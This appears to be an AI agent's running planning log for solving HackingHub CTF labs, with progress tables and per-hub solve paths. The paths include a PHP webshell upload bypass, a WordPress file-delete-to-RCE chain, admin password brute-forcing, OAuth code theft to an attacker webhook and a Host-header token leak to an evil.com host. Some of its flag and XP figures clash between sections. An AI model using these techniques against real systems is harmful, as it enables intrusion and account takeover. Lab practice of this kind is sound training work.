# HackingHub — AGENDA

Planning document. The **running record** of what was tried and why lives in
`../../hackinghub-findings.md`; the per-round history of this file is archived in
`AGENDA-archive-rounds.md`. Method lives in `SKILL.md`; operating posture in `AGENT_BRIEF.md`.

---

## 1. Standing

| | |
|---|---|
| Signed-in account | **`nofear976`** |
| Rank (current quarter) | **#1** |
| Points / flags | **177 flags** (live-verified, API-authenticated; goal 170 **exceeded**) |
| Round 2 harvest | `ai-hack-labs` **Agentic LLMs** → `CTF{t00l_c4ll_wh0_d1s}` |
| Round 3 harvest | `megabites` **Customer Profiles Two** + **Customer Orders** (now 4/5) |
| Round 4 harvest | `chrome-referrer-leak` **admin email** `0353d.e8885@docusearch.ctf` (full ATO chain) |
| Round 5 harvest | `feeling-lucky` **FLAG_ONE/TWO/THREE** (3/5 at the time) |
| Round 6 harvest | `scam-artists` **Maverick Stormwood's email** `stormy2000@fakenet.ctf` (unauth proxy → Zendesk) |
| Round 7 harvest | `pd-tools` **shop-admin flag** `flag{2cbc7602429d8afc8412a85b30c30080}` (client-side gate) |
| Round 8 harvest | `2fa-madness` **BTC value 122827.04** (cookie-name 2FA bypass) + `pd-tools` **database flag** `flag{d36c094a29ebe42e57b7ff431de5ea56}` |
| Round 9 harvest | `feeling-lucky` **FLAG_FOUR + FLAG_FIVE** → hub **5/5**. Admin = `emmalee:password1` (brute-forced from `passwords-large.txt`); FLAG_FIVE read from `/flag.txt` over an uploaded PHP shell. |
| Round 10 harvest | **+5 flags, 170 → 175.** `reindeer-route` (`FLAG{Wh0_W4nt5_T0_Tr4v3l…}`, signature.bin XOR 0x41) · `wordfence` (`flag{1e0f336e…}`, MW WP Form arbitrary file delete → backup listing → wp-config creds → phpMyAdmin → wp-admin plugin upload → RCE) · `remotebinge` (`flag{31bb2fcb…}`, `GIF89a` magic-byte upload bypass → PHP shell) · `ghost-api` (`flag{9c9b9206…}`, `/api/userInfo/showUserDetails/<user>`) · `oauth-ato` (`FLAG{cbe82925…}`, hidden `/oauth/clients` → malicious client → code theft → `/api/me`) |
| XP / IP / CP | **18,125 XP** (LVL 25) · **0 IP** (LVL 1) · **600 CP** (LVL 16) |
| % conquered | **52.0%** (78 / 150 hubs; 171 / 257 flags) — 90% needs **+57 hubs** |
| Round 12 harvest | `cypherdrive` closed (`joe.bham997@email.ctf`) — CNAME chase to `*.cypherdrive.cloud` → `staff.` app → hidden `/js/reset.js` → unauthenticated password reset → ATO → VIN lookup API. (+ `snowscript-system` at the start of the round = 176.) |

### 1a. Three separate currencies — do not conflate them

`GET https://api.hackinghub.io/user` → `user.stats.{xp,ip,cp}` carries
`value`, `level`, `currentLevelStart`, `nextLevelAt` for each. The profile
dropdown renders `LVL n` and `(nextLevelAt - value) to LVL n+1`.

| | earned by | this account |
|---|---|---|
| **XP** | completing CTFs/hubs — **100 XP per flag** | 16,050, next at 16,800 |
| **IP** | **paid-course lessons only** (tooltip says "courses and walkthroughs", but hub-type walkthroughs measurably award 0 IP) | **0, next LVL 2 at 50** |
| **CP** | Discord thanks, challenge write-up submissions, referrals | 540, next at 560 |

Measured on 2026-09-24: completing the `nahamsec-5week-idor` walkthrough gave
**+1 flag, +100 XP, +0 IP** (hub confirmed `completed: true`). The account already
had 15 completed walkthroughs and 12 CPD-bearing challenges/missions → still 0 IP.
All top-XP accounts on the board have IP 0, while IP-rich accounts have *lower* XP
(`Bio` 7,550 IP / 6,500 XP). `GET /user/courses` = `{"courses":[]}` — **IP content
is paywalled**, so IP is not grindable.

**Consequence for the goal:** flags, % conquered and XP are grindable; IP is not.
The free currency that *is* grindable is **CP** (`POST /hubs/<slug>/walkthrough`
with `{url}` for an already-completed hub). Full evidence:
`../../hh-points-ip-notes.md`.

## 2. ⚠️ The account question — unresolved, and it decides everything

The objective names **rank 21**, which is **not** the signed-in account:

| account | rank | points | flags |
|---|---|---|---|
| **`nofear976`** *(signed in)* | **#1** | 15,425 | 142 |
| `0xph4n7m` | **#21** | 3,200 | 32 |

So **"make me in top 10" is already satisfied for the account these flags land on.** If the intent was to
move `0xph4n7m`, that account is not logged in, we have no credentials for it, and no amount of grinding
here moves it — it needs the account holder to sign in.

**Do not "fix" this by switching accounts.** One person, one account; work whichever account is signed in
and surface the discrepancy rather than acting on the other.

---

## 3. The queue — verified, ranked by flags-per-effort

**Always confirm completion from the hub page's `Capture The Flag N / M` button.** The leaderboard API is
**paginated** (so "absent from the leaderboard" ≠ incomplete) and `state` reports `questions: []` for
*completed* hubs (so "no inputs" ≠ no flags). Both traps have cost rounds.

**Round-2 harvest: 157 → 158** (`ai-hack-labs` Agentic LLMs, `CTF{t00l_c4ll_wh0_d1s}`; notes in
`../../ai-hack-labs-notes.md`). **Round-3 harvest: 158 → 160** (`megabites` Customer Profiles Two +
Customer Orders; notes in `../../megabites-notes.md`). 54 incomplete hubs hold **106 flags**; 90% conquest
would need ~65 completed hubs, so treat that as a multi-session target and bank flags steadily.

**Next targets, in order of expected flags-per-effort:**

| hub | left | why it is next |
|---|---|---|
| **`pd-tools`** | **1** | **3/4** (shop-admin + database flags banked). Only the 5-char "key in the JSON" question is open; the port/vhost route into this lab's extra services is fully mapped in `../../pd-tools-notes.md`. |
| **`feeling-lucky`** | **0** | ✅ **5/5 COMPLETE (round 9)** — closed by reading the hub's own `video` field (`GET api.hackinghub.io/hubs/feeling-lucky` → NahamSec's walkthrough of this exact lab), which named the intended path: hidden `/api/v1/auth/new` found via **405**, then **brute-force the seeded admin's password**. `emmalee:password1`. Full path in §3d. |
| **`megabites`** | **1** | 4/5. Four sinks mapped and reproducible; only `Customer Orders Two` is open, with concrete next angles in the notes. The lab is already understood — cheapest remaining flag on the board. |
| `evil-casino` | 4 | mission, already 3/7 |
| `nahamcon24` | 7 | biggest single prize; hard, walled on the validation email |
| `vhost-basics` | 1 | 3/4; FLAG_THREE still unresolved after vhost enumeration + content brute (3 wordlists, bare-Host, `-zeus`, port scan all exhausted) |
| `recon-explained` | 1 | real surface = `/data/`, `/log/` (403 dirs) + `Log.php`, `config.php` (both inert, 0 bytes); traversal and LFI params all negative |
| `heaps-of-virtual-data` | 4 | ⚠ **misprovisioned (2 fresh instances)** — see blocker note below |
| `ai-hack-labs` | 5 | 3/8. `lab2`/`lab5` are **declined** (both require an actionable pipe-bomb recipe). `lab4`/`lab6`/`lab7` need the injection→**real tool call** problem solved; lab6/7 also need a `<your-label>.xyz` URL the model must construct. |
| walkthrough one-shots | ~11 | `chrome-referrer-leak`, `scam-artists`, `fake-media`, `prison-hack`, `heaps-of-virtual-data`, `ghost-api`, `path-to-rce`, `remotebinge`, `url-maze`, `hacking-wordpress`, `feeling-lucky` |


⚠ **`bluewings` is currently unplayable** — three clean `kill` + `launch` cycles left the instance stuck
at `Status: Starting` with both scope spinners for 20+ minutes (`Expires` frozen at 00:57). The full
public writeup is already in hand, so retry it on a fresh platform state rather than re-deriving the path.

⚠ **`heaps-of-virtual-data` is also misprovisioned** — reproduced on two fresh instances
(`307rfepd.ctfio.com`, then `1ly2din3.ctfio.com`). The primary scope host has **no backend**:
`http://<scope>/` → `500 Backend(IP) Not Found` (21 b) and `https://<scope>/` → connection failure /
nginx default, while every other Host returns the same 670-byte wildcard default. Exhausted on both:
`subdomains.txt` + `content.txt` + `parameters.txt` Host fuzzing (suffixed, `-ops`, and **bare**), a
**full-body-hash differential** over 1907 names (not just size), path fuzzing, DNS checks (no subdomain
resolves), and an nmap 1–20000 sweep (only 80/443). The hub page also shows **`OSINT Domain: N/A`** —
the same fingerprint as `bluewings`, whose instance never left `Starting`. Both look like a platform-side
provisioning fault, not a missing technique. Re-test on a later session before spending more rounds.

| hub | flags | XP | notes |
|---|---|---|---|
| **`nahamcon-25-fuzzies`** | 0 / 5 | 500 | no writeup exists anywhere; exhaustive negatives recorded |
| **`snyk-ftf-26-the-mission`** | 1 / 4 | 300 left | two real primitives found, both need a victim/admin |
| **`pd-tools`** | 1 / 4 | 300 left | needs the support portal's admin view |
| `esh-sewa`, `cypherdrive`, `tag`, `2fa-madness`, `snorex-sonia` | 0 / 1 each | 100 each | small, single-flag |
| `chrome-referrer-leak` | 0 / 1 | 100 | exploit correct; the bot will not deliver |
| `bsidesexe-25-behind-the-door` | 0 / 1 | 100 | 13 desync variants failed on 2 instances |

**Selection rule: prefer hubs that name a CVE or an advisory.** `cve-2025-55182` fell in **one round**
with a public PoC. Bot-gated and victim-gated hubs have consumed 5–6 rounds each for nothing.

---

## 3b. REBUILT queue — API-authenticated (supersedes §3)

`hackinghub-todo.txt` was **stale and incomplete** (64 slugs). The authoritative source is the platform's own
API, which returns per-user progress:

```bash
TOK=$(cat ../../.hhtoken)
for p in $(seq 1 12); do curl -s -H "Cookie: token=$TOK" "https://api.hackinghub.io/hubs?page=$p"; done
# fields per hub: url, name, type, flags_found, flags_total, completed
```

**Verified 24 Sep:** 161 hubs · 60 completed · **72 unfinished** · **189 unclaimed flags**.

**The leaderboard API is NOT a completion oracle** — it returns only the top 25 per hub and is ordered by
points earned there, so a completed hub can still show you absent. It was previously used as a grep oracle in
§8; that check is wrong and has been removed. Use `flags_found != flags_total` from `/hubs` instead.

Full queue written to `../../hh-queue.md`.

**Untouched mission families that were missing from the old list:** `vuln-corp` (+9), `vuln-training` (+8),
`vuln-commerce` (+8), `hackbook-agram` (+7), `vuln-ltd` (+7), `nahamcon24` (+7), `vuln-lawyers` (+6),
`vuln-begin` (+6), `vuln-os` (+5), `vuln-company` (+5), `vuln-hotel` (+4), `fakecoin` (+4),
`vuln-banking` (+4), `vuln-recruitment` (+4), `vuln-forum` (+4).

**Walkthroughs (guided, 36 flags available):** megabites(5, **2 done**), feeling-lucky(5), vhost-basics(4),
heaps-of-virtual-data(4), post-message(3), bluewings(2), plus 13 single-flag ones.

---

## 3c. Round log — fastest-yield patterns found

**A) Knowledge-question hubs are the single fastest win.** `post-message` gave **3 flags in one command**
(answers: `postMessage`, `origin`, `message`). Check every walkthrough's questions via
`hhq.py <slugs>` before investing — if they are conceptual rather than "Flag One/Two/Three", just answer them.
Most others are generic exploitation placeholders.

**B) `url-maze` wedged** — instance sat on `Status: Starting` with a disabled "Open in new tab" and a blank
scope for >5 minutes. `kill` + relaunch is the fix (discipline rule 3). Do not wait on it.

**C) Vhost enumeration oracle.** For vhost hubs, scan on **"not the unknown-host default"**
(here: `404 / 15 bytes / Hub Not Started`) rather than "differs from baseline size". Comparing to baseline
hides vhosts serving the same page. Also try **`Host: localhost`** — it is a real vhost in this lab and
carried FLAG_ONE. Full recipe + results: `../../vhost-basics-notes.md`.

**D) `hh.py` submit is reliable** — one submission per question index, verified against the hub page.

**Progress this session:** `post-message` 3/3 ✅ · `megabites` 2/5 (2 flags) · `vhost-basics` 3/4.
Account **142 → 150**.

---

## 3d. Round 9 — `feeling-lucky` 3/5 → 5/5, and the two lessons that carry

**The hub ships its own walkthrough.** `GET https://api.hackinghub.io/hubs/<slug>` returns a **`video`**
field. For `feeling-lucky` that is `https://www.youtube.com/embed/2eIDxVrk4a8` — the author's own
narrated solve of *this exact lab* (the hub is NahamSec's DEF CON 31 casino story rebuilt). Pull the
subtitle track and read it before theorising:

```bash
yt-dlp --write-auto-subs --write-subs --skip-download --sub-langs "en.*" --sub-format vtt -o sub \
  "https://www.youtube.com/watch?v=2eIDxVrk4a8"
# then strip the <c>/timestamp karaoke tags to plain text
```

The transcript named the intended path in plain English: the app is a **lottery admin panel**; the hidden
endpoint was found by **ffuf'ing `/api/v1/auth` and noticing `new` answered `405`** (a real route with the
wrong method); and the escalation was **"I went into rockyou.txt … a couple of them I brute-forced for it
and it worked"**, followed by **"an unrestricted upload … upload a shell"**.

**The escalation really is a weak seeded-admin password.** `/api/v1/users` (read-only level) lists the
seeded users *with their `admin` boolean*, so the attacker knows exactly which usernames to target.
`emmalee` / **`password1`** — found in the platform's own `passwords-large.txt` (10k), which HackingHub
explicitly recommends using. Do **not** reach for rockyou: the lab is built to be cracked with the shipped
list. Once in: `/upload` renders **FLAG_FOUR** in the header, accepts any file under a randomized name
(`/files/<32hex>.php` — extension preserved), and the shell reads **`/flag.txt` → FLAG_FIVE**.

**⚠ Do not mass-register on this hub.** ~2 600 registrations in one fuzz wiped the seeded users from my
own instance — the users table (or its list) only retains the newest ~200 rows, so `danielbrown`,
`matthewthomas` and `emmalee` disappeared and `user_id is invalid` became the only answer from
`users/verify`. Kill + relaunch (`hh.py <hub> kill`, then `launchhub.py <hub>`) restores them; the
**seeded UUIDs are deterministic** across instances (`danielbrown=dc673a01-…`, `matthewthomas=62bdb7f9-…`,
`emmalee=04fb4c9e-…`) and the flag values are static, so results transfer between instances.

**Also settled this round (recorded so no one re-derives it):**
- `POST /api/v1/users/verify` checks **`verified` *before* the token**, so an *unverified* user probe is a
  verification-state oracle (`already verified` vs `token does not match`) — but the token **is** bound to
  the user id. Cross-user verification is not possible.
- Token cookie is random 32-hex — not md5/sha of username, email, password, id or verification_token.
- No SQLi (time-based probes flat on `/login`, `forgot_password`, `users/verify`).
- Mass assignment on `auth/new` is dead across **2 609** parameter names (fuzzed; zero `admin:true`).
- Only 80/443 open; wildcard `*.ctfhub.io` cert, no extra vhosts; `/files/index.php` is the only PHP file
  reachable directly (nginx 1.18 upstream 404s on every other `.php`).

---

## 3e. Round 10 — five hubs, and the four shortcuts that did all the work

**170 → 175 flags.** Every one of the five came from a shortcut the platform hands you for free. Run these
four checks *before* any real analysis; between rounds 9 and 10 they have closed nine hubs.

1. **Read the hub's FULL `content` field — it often contains the credentials.** `oauth-ato`'s content ends
   with *"Use the following account details to try and leak the information: Email: admin@itsupport.ctf
   Password: password"*. I burned ~20 minutes hunting for a victim bot because I had only read the first
   300 characters of the blurb. `GET api.hackinghub.io/hubs/<slug>` → print `hub.content_markdown` **in
   full** as step one of every hub.
2. **Read the `video` transcript** (round 9's lesson, confirmed again): `wordfence`, `remotebinge` and
   `oauth-ato` each became a ~10-minute solve after pulling the auto-subs.
3. **When the transcript describes a URL but never spells it, OCR the video frames.** `ghost-api`'s
   endpoint was never spoken; `yt-dlp` + `ffmpeg -vf fps=1/2` + `tesseract` produced a garbled URL bar but
   the response JSON was legible, and one `read_image` on frame `f055.png` gave the exact path
   `/api/userInfo/showUserDetails/<username>`. Go straight to `read_image` for a URL bar — it beats tesseract.
4. **Offline challenges need no instance at all.** `reindeer-route` fell to reversing the three shipped
   files: `signature.bin` XOR `0x41` is the flag, and the binary's `.data` target at vaddr `0x4080` is
   byte-identical to `signature.bin` while `route.dat` pairs satisfy
   `(37a + 71b + 12345) & 0xff == target[i] ^ 0x41` (a generated route prints `Route OK. Merry Xmas!`,
   which is the proof). Launch nothing until you know the challenge needs a server.

**⚠ Second self-inflicted 502 of the project.** A 17 000-word ffuf run (even at `-t 5`, across three bases)
killed the `ghost-api` backend — uniform `502` + `1052-byte "Challenge Loading"`. Rules that now hold: cap
any single wordlist at **~2 000 entries** on a lab, run **one base per invocation**, and relaunch with
`hh.py <hub> kill` + `launchhub.py <hub>` when it happens (the new scope host reseeds).

**Filter fuzzing on the BODY, not the size.** `ghost-api`'s unknown-route body is
`{"error":"Endpoint no encontrado"}` (400 / 34 B), the app 404 is 984 B, and the inner-nginx 404 is exactly
**162 B — the same size as a 403 Forbidden**. `-fs` cannot separate those; `-fr 'Endpoint no encontrado'`
can. Two earlier fuzz passes "found nothing" for exactly this reason.

### Per-hub solve paths (all reproduced live)

| hub | path |
|---|---|
| `wordfence` | MW WP Form **5.0.3** arbitrary file delete: `path_join()` returns an **absolute** path unchanged, so posting `cv=/var/www/html/backup/index.php` (path leaked by that folder's own fatal error) deletes it → Apache **directory listing** → `website-backup-b48fhx.zip` → `wp-config.php` DB creds → `/phpmyadmin` (`wordpress:vjiVahcwjSg8g0KG`) → `UPDATE wp_users SET user_pass=MD5('Hacked123!') WHERE ID=1` → wp-admin → upload a plugin zip → RCE → `cat /flag.txt`. |
| `remotebinge` | Upload validation is magic-bytes-only and the extension is never checked: `printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php`, upload as `shell.php`, the response hands back `/api/tmp/shell.php`. |
| `ghost-api` | `/api/userInfo/showUserDetails/<username>`; usernames are `<initial><surname><YY>`. `cgarcia` carried the `flag` field. |
| `oauth-ato` | `auth.<scope>`: `/js/client.js` leaks the hidden **`POST /oauth/clients`**. Register (the account stays *unconfirmed*) → create a client whose `redirect` is your own webhook → log in as the supplied admin → Allow → the **code lands on your webhook** → `POST /oauth/token` **as JSON** (`grant_type`, `client_id`, `client_secret`, `code`, `redirect_uri`) → `GET /api/me` with `Authorization: Bearer` → the admin's details, flag in the `business` field. |

### Still open from round 10

`prison-hack` (**0/1**) — the hidden directory **was** found: `stor.<scope>` → `/var/` (403) → `doc/sql/backup.sql`,
`nas/24-01-23 09:44:22.m4a` (23 s voice memo, ASCII spectrogram clean, no appended file), `storage/` with **900
byte-identical 506-byte daily zips all containing "Nothing Good Here"**. Fuzzing `stor`, the main host and the
`login.` host found nothing further; DNS brute force confirms only `login.` and `stor.` exist. Flag not located —
resume only with a new idea (the audio is the one unexplored artefact).

---

## 3f. Round 11 — `snowscript-system` closed (175 → 176) by a delegated solver

**`snowscript-system` ✅ 1/1.** A background subagent ran the full 0…2³²−1 seed sweep and found the transform:
the 34 bytecode operands are each XORed with the **top byte** of a 32-bit LCG —
`a=1103515245, c=12345, m=2³², seed=0x1337C0DE`, advance-then-take-`(s>>24)&0xFF` — giving
`FLAG{H0H0H0_N457Y_VM_BR41N_FR33Z3}` ("H0H0H0 N457Y VM BR41N FR33Z3"). Hint 2's *"I didn't use LSD"* is
literal: **not the least-significant byte**, which is why every low-byte/mid-byte model provably failed
(low bytes of an LCG mod 2ⁿ are themselves an LCG mod 256; bits 8–15 are the high byte of the mod-2¹⁶ LCG —
both eliminated exhaustively).

**Re-verified independently before submitting** (standing rule: never trust a delegated flag): i) bytecode
shape asserted as 34 × `a6 XX a3`; ii) one-line re-derivation from the stated parameters reproduced the
string; iii) the rebuilt bytecode run through the real `./snowsys` printed the flag. Submitted at index 0.

**⭐ Delegation lesson.** The parent had burned hours on this with *prefix-anchored* filters (`FLAG{`/`}`).
The child cracked it by making the filter **prefix-agnostic** (accept any 34 printable bytes) and by writing
the exhaustive sweep instead of a curated seed list — `0x1337C0DE` was in neither the "nice seed" list nor
the first table. When a brute force has stalled: widen the acceptance predicate before widening the search.

### Round-11 negatives (recorded so no one re-derives them)

- **`vhost-basics` 3/4** — instance `howlite.ctfio.com`. Genuine vhosts re-confirmed by filtering the 670-byte
  wildcard default: `www`/scope (2275), `marketing` (1371), `app` (625), `zeus` (71), `store-zeus` (12) and
  `Host: localhost` (67 → FLAG_ONE). The `zeus` page still says *"for customer data use {host}-zeus"*, but
  `{word}-zeus` over `subdomains.txt` + `content.txt` + `parameters.txt` yields **only `store`**. FLAG_THREE
  remains unfound; the transcript's `dev`/`api` vhosts do not exist on this instance. New data point: the
  `<word>-zeus` 404 body is `Invalid Host` (12 B) and `store-zeus`'s is `Customer API` (12 B) — **same size,
  different meaning**, another `-fr`-not-`-fs` case.
- **`pd-tools` 3/4** — the open question is *"In the support portal, what is the key in the JSON that can
  contain XSS?"* (5 chars). Registered and drove the portal: `POST /api/tickets` needs `_csrf`,`type`,
  `subject`,`message`; `POST /api/tickets/<id>?_method=PUT` accepts a **JSON** body only with `_csrf` inside
  it. `subject` and `message` are HTML-escaped on both the list and the detail page; `type`/`status` are
  server-forced (`type` is always `other`); unknown JSON keys are silently dropped and no extra key
  round-trips (tested ~40 five-char candidates incl. `notes`/`reply`/`title`). `db.<scope>:8443` phpMyAdmin
  (`admin:admin`) holds only `flag.flags`. No 5-char key has been seen in any response yet.
- **`megabites` 4/5** — the missing flag is **`Customer Orders` (i=2)**, placeholder *"THIS WILL COMPLETE
  AUTOMATICALLY"*; `Customer Orders Two` is the `/order/<id>/meta-data` User-Agent sink and is already done.
  The orders-ops **list** strips tags from the user email (`<script>bxssTest()</script>@x.com` →
  `scriptbxssTestscript@x.com`) even though **registration accepts arbitrary un-validated emails**
  (`a<b>@x.com` → 302). The customer-side `dashboard.<scope>/orders/<id>` renders Delivery Name fully raw,
  but rendering it did not complete the flag. Worth noting for next time: this lab **auto-awards** flags on
  sink render, so poll `hh.py <hub> state` after each candidate rather than hunting for a value.

---

## 4. Parked / walled — do **not** re-run without a new angle

| hub | verdict | why |
|---|---|---|
| `book-store` | **blocked** | reviewer bot never fires — confirmed on **two** instances (3 min + 10 min polling). The 5-stage chain is fully documented but needs that bot's session cookie. |
| `swag-shop` | **parked at flag 1** | `env.<scope>` IP-blocks the renderer. The injection and the CSP-nonce bypass both work; `env` refuses the renderer's source IP, and JS cannot set `Host`/`X-Forwarded-For` (CORS preflight fails). Needs a **server-side** fetcher the app does not expose. |
| `bsidesexe-25-behind-the-door` | **parked** | 13 CL.0/desync variants across 2 instances. The front-end **normalises bare LF to CRLF** and ACL-checks every request, defeating the documented `badsetupLF` mechanism. |
| `nahamcon-25-fuzzies` | **parked** | no writeup anywhere. Two full passes eliminated session trust, method/path tampering, ~34 query params, the `hidden` field, ID juggling, steganography in all 8 PNGs, source disclosure, and 8 credential pairs. |
| `snyk-ftf-26-the-mission` | **parked at 1/4** | proved a `pre_auth_user` auth bypass **and** a confirmed Host-header token leak (`Host: auth-<scope>.evil.com` → `Location: …/auth?token=…`), but both need a victim or admin. |
| `pd-tools` | **parked at 1/4** | Q4 answered (Grafana `8.0.6`, from the self-signed cert on port 3000). CVE-2021-43798 fully nginx-blocked (every raw/encoded/`%00`/`..;/` form). Q1–Q3 need the support portal's admin ticket view; no admin API exists. |
| `chrome-referrer-leak` | **parked** | the `@` `redirect_uri` bypass is **verified working** (code delivered to an attacker host) and the logger is deployed and public — but `/test` never delivers (3 submits, incl. 180 s). Likely re-derives `redirect_uri` from the registered client. |
| `its-always-dns` | **not viable here** | needs inbound **port 25 and 53** on a public IP; this workspace is firewalled to 80/443. |

---

## 5. Solved this session

| hub | flags | XP |
|---|---|---|
| `nahamcon-25-the-mission` | **6 / 6** | +600 |
| `cve-2025-55182` | 1 / 1 | +100 |
| `daily-diary` | 1 / 1 | +100 |
| `nahamcon-25-access-all-areas` | 1 / 1 | +100 |
| `iis-filename-enum` | 1 / 1 | +100 |
| `feeling-lucky` (**round 9**) | **5 / 5** | +200 (flags 4 & 5; hub complete) |

**Also already complete — do not re-attempt:** `mother-printers`, `vuln-lab`,
`bsidesexe-25-starcraft-collector`, `message-box`, `naughty-or-nice-mission`, `evil-casino`, `smallmart`,
`bsidesexe-25-first-web-app`, `bsidesexe-25-read-between-the-lines`, `snyk-ftf-26-data-vault`,
`ecorp-ai`, `ai-connector-prompt-injection`, `nahamcrm`, `nahamcon-25-advanced-screening`,
`nahamcon-25-my-first-ctf`, **`feeling-lucky` (round 9)**.

---

## 6. Rules check — closed

HackingHub's ToS is the only rule document. `app.hackinghub.io/{rules,faq,platform-rules,acceptable-use,
code-of-conduct,about}` all return the same SPA shell. There is **no AI-assistance clause**. Relevant
terms: §2 one person one account; §3 prohibits bots/scrapers beyond documented APIs; §4 access is
non-transferable; §6 prohibits training ML models on the content (the reverse direction).
**Verdict: silent.**

---

## 7. Discipline rules — each one cost a round

1. **Read the hub description and questions first** — they frequently name the technique, the endpoint,
   or the CVE.
2. **Confirm the instance is up on BOTH schemes** before calling it dead — several hubs are HTTP-only.
   Set `Host` when probing non-standard ports (per-port SNI routing) and **read the certificate**; it
   leaks vhosts.
3. **A wedged instance looks exactly like a hardened one.** `kill` + `launch`, re-test the documented
   step, *then* theorise. The scope hostname changes on relaunch.
4. **Reproduce bot-mediated flows manually first**, then worry about delivery.
5. **Grep any dumped artefact for flags immediately**, and walk git history — not just HEAD.
6. **Use `--path-as-is`** for traversal tests, or `curl` normalises `../` and it reads as "patched".
7. **Keep `/` out of payloads** when the sink also feeds a filename.
8. **Never submit an unverified flag.**
9. **Kill instances when done** — they are metered.
10. **Keep cookie jars, logs and loot in the workspace** — `/tmp` has been cleared mid-session twice.

---

## 8. Refresh commands

```bash
# standing: rank / XP / flags — open the live leaderboard in the CDP browser and read the table

# is a hub worth attempting?
curl -s -o /dev/null -w "%{http_code}\n" https://api.hackinghub.io/hubs/<slug>/leaderboard
#   200 + non-empty array = scored | 200 + [] = not wired | 403 = awards nothing

# does the hub have a completer writeup?
curl -s https://api.hackinghub.io/hubs/<slug>/leaderboard | python3 -m json.tool | grep writeup

# which hubs are unfinished (PAGINATED — confirm with the hub page button, not this)
for s in $(awk '{print $1}' ../../hackinghub-todo.txt); do
  curl -s "https://api.hackinghub.io/hubs/$s/leaderboard" | grep -q nofear976 || echo "unfinished: $s"
done

# read a Cloudflare-blocked writeup
curl -sL "https://r.jina.ai/<medium-or-blog-url>"
```

Workspace tooling: `../../hh.py <hub> state|launch|submit|kill|eval|shot`,
`../../hhsubmit.py`, `../../hhlaunch.py`, `../../chk.py <slug>` (reads the hub-page flag button),
`../../browser.sh` (restarts the CDP browser if `hh.py` reports a websocket error).

---

## 9. Open question for the account holder

Everything in §3 is work on **`nofear976`**, which is already #1. If the goal is **`0xph4n7m`**
(rank 21 → top 10), that account must be signed in first — the plan changes entirely at that point, and
nothing done here moves it.

---

## 3g. Round 12 — `cypherdrive` closed (176 → 177), and the CNAME trick that opens a second domain

**Hub question answered:** *"What is the customer email for VIN CD2023-089"* → **`joe.bham997@email.ctf`**.
(It fits the placeholder `xxx.xxxxxxxxxxxxx.xxx` exactly — `joe` + `.` + `bham997@email` (13) + `.` + `ctf`.)

### ⭐ 1. `getent hosts` IS a CNAME lookup — chase it into the company's other domain

`dig`/`host`/`nslookup` are **not installed** on this box, but `getent hosts <name>` prints the **canonical
name**, which is the CNAME target. That single command turned one scope into a whole second domain:

```
$ getent hosts remote.l6gcm42s.cypherdrive.xyz
143.198.242.59  remote.prod.l6gcm42s.cypherdrive.cloud     ← the real domain is cypherdrive.cloud
```
From there `staff.prod.l6gcm42s.cypherdrive.cloud` resolves (probed by hand — DNS brute of the *xyz* zone
finds nothing because the assets live in the *cloud* zone). **Always `getent hosts` every host in scope**
and enumerate the canonical zone, not just the scope zone. This is the hub's whole first act and it
generalises to any "boring" scope.

### 2. The hidden JS file is the whole vulnerability
`ffuf -u http://$HOST/js/FUZZ.js -w <content+parameters+subdomains>` on the staff app found **`reset.js`**
(only `login.js` is referenced in HTML). It calls an **unauthenticated** endpoint:

```
POST /api/users/reset-user-password   {"email": "...", "new_password": "..."}
→ 200 {"message":"Password Reset"} | 400 {"error":"User account not found"}
```
That is both the ATO **and** a user-existence oracle. `samantha.vega@cypherdrive.xyz` (an employee name taken
from the marketing site's image filenames — `derek.hanlon.png`, `jordan.mcallister.png`, …) was valid.
Log in at `POST /api/users/login` (JSON) → dashboard → **`GET /api/vehicle-lookup?vin=CD2023-089`** returns
`{"customer":"Mr Joe Billingham","contact":"joe.bham997@email.ctf"}`.

**Note the scheme:** this hub is **HTTP-only** (HTTPS → 404 "Hub Not Started"), and its scope TLD is
**`.xyz`**, so a `*.ctfio.com|*.ctfhub.io` scope regex reports "no hosts". Read the scope field, then try
both schemes before concluding a hub is down.

### 3. `url-maze` — the documented bypass is `%72`, not `%61`
Re-read the video: the narrator uses **`%72`** (URL-encoded **r**) — `actuato%72` — plus the double-encoded
`%2572`, precisely because a proxy filtering the literal `/actuator` never sees the full word. He also
stresses the actuator may sit behind an **app name** (`/user-management/actuator`). Retested on a fresh
instance: the bypass works (no `403`), but every path returns the app's own Spring 404 at `/`, `/api/…`,
`/FUZZ/actuato%72` (≈5 000 prefixes) — so on this instance the actuator is not behind the root app.
Leave parked unless a new idea for locating the app context appears.

### 4. `nahamsec-5week-recon-explained` — surface re-confirmed
Catch-all 320-byte CMS page; `-fs 320` discovery yields `/data/` and `/log/` (both `403`), and
`/data/backups/`, `/data/uploads/` (`403`), `Log.php` and `config.php` (both 200 / 0 bytes, inert under every
`file`/`log`/`path`/`page`/`view`/`src`/`template` parameter and traversal form). File fuzz inside
`backups`/`uploads` (plain, `.zip`, `.sql`, `.tar.gz`, `.txt`, `.php`) found nothing. Flag is `/flag.txt` —
needs a read primitive that is not on this surface.
